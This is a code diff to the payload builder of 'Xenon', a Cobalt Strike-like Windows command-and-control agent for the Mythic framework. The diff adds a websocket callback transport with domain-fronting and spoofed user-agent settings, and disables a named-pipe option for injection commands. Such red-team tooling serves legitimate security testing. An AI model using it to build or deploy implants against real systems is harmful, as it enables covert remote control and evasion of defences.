@@ -16,9 +16,9 @@ class XenonAgent(PayloadType):
     supported_os = [SupportedOS.Windows]
     wrapper = False
     wrapped_payloads = []
-    note = """A Cobalt Strike-like agent for Windows targets. Version: v0.0.6"""
+    note = """A Cobalt Strike-like agent for Windows targets. Version: v0.0.7"""
     supports_dynamic_loading = True
-    c2_profiles = ["httpx", "smb", "tcp"]
+    c2_profiles = ["httpx", "smb", "tcp", "websocket"]
     mythic_encrypts = True
     translation_container = "XenonTranslator"
     build_parameters = [
@@ -37,14 +37,14 @@ class XenonAgent(PayloadType):
             default_value="exe",
             description="Output type: shellcode, dynamic link library, executable",
         ),
-        BuildParameter(
-            name = "default_pipename",
-            parameter_type=BuildParameterType.String,
-            group_name="Spawn",
-            format_string="[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}",
-            randomize=True,
-            description="Default string to use as named pipe output for spawn & inject commands. (e.g., execute_assembly, inject_shellcode)"
-        ),
+        # BuildParameter(
+        #     name = "default_pipename",
+        #     parameter_type=BuildParameterType.String,
+        #     group_name="Spawn",
+        #     format_string="[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}",
+        #     randomize=True,
+        #     description="Default string to use as named pipe output for spawn & inject commands. (e.g., execute_assembly, inject_shellcode)"
+        # ),
         BuildParameter(
             name = "spawnto_process",
             parameter_type=BuildParameterType.String,
@@ -99,8 +99,8 @@ class XenonAgent(PayloadType):
         )
     ]
     agent_path = pathlib.Path(".") / "xenon" / "mythic"
-    # agent_icon_path = agent_path / "agent_functions" / "xenon_agent.svg"
-    agent_icon_path = agent_path / "agent_functions" / "v1-transparent.png"
+    agent_icon_path = agent_path / "agent_functions" / "xenon_agent.svg"
+    dark_mode_agent_icon_path = agent_path / "agent_functions" / "xenon_agent.svg"
     agent_code_path = pathlib.Path(".") / "xenon" / "agent_code"
     
     build_steps = [
@@ -141,7 +141,14 @@ class XenonAgent(PayloadType):
             # SMB only
             "pipename": "",
             # TCP only
-            "port": ""
+            "port": "",
+            # Websocket only
+            "callback_host": "",
+            "callback_port": "",
+            "ENDPOINT_REPLACE": "",
+            "USER_AGENT": "",
+            "domain_front": "",
+            "tasking_type": ""
         }
         stdout_err = ""
         
@@ -208,7 +215,17 @@ class XenonAgent(PayloadType):
                 else:
                     Config[key] = val
             break
-        
+
+        # Websocket: Push-only (Poll is not supported)
+        if selected_profile == 'websocket':
+            tasking_type = Config.get("tasking_type", "Poll")
+            if tasking_type != "Push":
+                resp.set_status(BuildStatus.Error)
+                resp.build_stderr = (
+                    f"[!] Xenon websocket transport only supports Push tasking_type "
+                    f"(got '{tasking_type}'). Select Push in the websocket C2 profile."
+                )
+                return resp
         
         if Config["proxy_host"] != "":
             Config["proxyEnabled"] = True
@@ -231,19 +248,19 @@ class XenonAgent(PayloadType):
         #######################################
         
         # CWD - Xenon/Payload_Type/xenon/
-        stub_dir = 'xenon/agent_code/stub'
+        # stub_dir = 'xenon/agent_code/stub'
         
-        postex_pipename = self.get_parameter('default_pipename')
-        cmd_stub = f"make PIPENAME={postex_pipename}"
-        proc = await asyncio.create_subprocess_shell(cmd_stub, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=stub_dir)
-        stdout, stderr = await proc.communicate()
-        if proc.returncode != 0:
-            build_success = False
-            logging.error(f"Command failed with exit code {proc.returncode}")
-            logging.error(f"[stderr]: {stderr.decode()}")
-            raise Exception(cmd_stub)
-        else:
-            logging.info(f"[stdout]: {stdout.decode()}")
+        # postex_pipename = self.get_parameter('default_pipename')
+        # cmd_stub = f"make PIPENAME={postex_pipename}"
+        # proc = await asyncio.create_subprocess_shell(cmd_stub, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=stub_dir)
+        # stdout, stderr = await proc.communicate()
+        # if proc.returncode != 0:
+        #     build_success = False
+        #     logging.error(f"Command failed with exit code {proc.returncode}")
+        #     logging.error(f"[stderr]: {stderr.decode()}")
+        #     raise Exception(cmd_stub)
+        # else:
+        #     logging.info(f"[stdout]: {stdout.decode()}")
         
         #######################################
         ### Write Postex Kit to disk       ####
@@ -342,8 +359,8 @@ class XenonAgent(PayloadType):
             spawnto_process_path = self.get_parameter('spawnto_process')
             serialized_data += serialize_string(spawnto_process_path)
             # Fork & Run default pipe name
-            inject_pipe_name = self.get_parameter('default_pipename')
-            serialized_data += serialize_string(inject_pipe_name)
+            #inject_pipe_name = self.get_parameter('default_pipename')
+            #serialized_data += serialize_string(inject_pipe_name)
 
             # HTTPX Specific
             if selected_profile == 'httpx':
@@ -383,12 +400,41 @@ class XenonAgent(PayloadType):
             if selected_profile == 'smb':
                 serialized_data += serialize_int(random.getrandbits(32))                            # Random P2P ID
                 serialized_data += serialize_string(f"\\\\.\\pipe\\{Config['pipename']}")           # \\.\pipe\<string>
-            # SMB Specific
+            # TCP Specific
             if selected_profile == 'tcp':
                 serialized_data += serialize_int(random.getrandbits(32))                   # Random P2P ID
                 serialized_data += serialize_string("0.0.0.0")                             # 0.0.0.0
                 serialized_data += serialize_int(int(Config["port"]))                      # 50005
-                
+
+            # Websocket Specific
+            if selected_profile == 'websocket':
+                callback_host = Config.get("callback_host", "ws://127.0.0.1")
+                if callback_host.startswith("wss://"):
+                    ssl = True
+                    hostname = callback_host[len("wss://"):]
+                elif callback_host.startswith("ws://"):
+                    ssl = False
+                    hostname = callback_host[len("ws://"):]
+                else:
+                    raise ValueError("callback_host must start with ws:// or wss://")
+
+                # Strip any path leftover on the host portion
+                if "/" in hostname:
+                    hostname = hostname.split("/")[0]
+
+                port = int(Config.get("callback_port", 8081))
+                endpoint = Config.get("ENDPOINT_REPLACE", "socket") or "socket"
+                if endpoint.startswith("/"):
+                    endpoint = endpoint[1:]
+                user_agent = Config.get("USER_AGENT", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
+                domain_front = Config.get("domain_front", "") or ""
+
+                serialized_data += serialize_string(hostname)
+                serialized_data += serialize_int(port)
+                serialized_data += serialize_bool(ssl)
+                serialized_data += serialize_string(endpoint)
+                serialized_data += serialize_string(user_agent)
+                serialized_data += serialize_string(domain_front)
 
             # Convert to hex string format for C macro
             general_config_hex = ''.join(f'\\x{byte:02X}' for byte in serialized_data)
@@ -400,7 +446,7 @@ class XenonAgent(PayloadType):
                 content = f.read()
                 
                 # Set the selected transport profile
-                profile_define_string = f"{selected_profile.upper()}_TRANSPORT"     # HTTPX_TRANSPORT | SMB_TRANSPORT | TCP_TRANSPORT
+                profile_define_string = f"{selected_profile.upper()}_TRANSPORT"     # HTTPX_TRANSPORT | SMB_TRANSPORT | TCP_TRANSPORT | WEBSOCKET_TRANSPORT
                 content = content.replace("%C2_PROFILE%", profile_define_string)
 
                 # Stamp in hex byte array
